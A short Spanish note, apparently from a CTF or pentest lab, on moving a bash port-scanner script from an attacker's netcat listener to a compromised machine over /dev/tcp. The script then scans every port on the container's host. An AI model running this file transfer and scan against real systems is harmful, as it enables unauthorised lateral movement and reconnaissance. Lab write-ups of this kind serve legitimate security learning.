
Nuestra maquina: nc -nlvp 443 < portScanner.sh
Maquina victima: cat < /dev/tcp/10.10.16.3/443 > portScanner.sh
Y despues despues desde la maquina victima, darle permiso de ejecucion con chmod +x portScanner.sh

```shell
#!/bin/bash

function ctrl_c(){
    echo "[!] Saliendo.."
    exit 1
}

trap ctrl_c INT

for i in $(seq 1 65535); do
    timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$i" 2>/dev/null && echo "[!]Puerto abierto: $i" &

done
```
Esto nos ayudo para hacer un escaneo de puertos desde un contenedor hacia la maquina host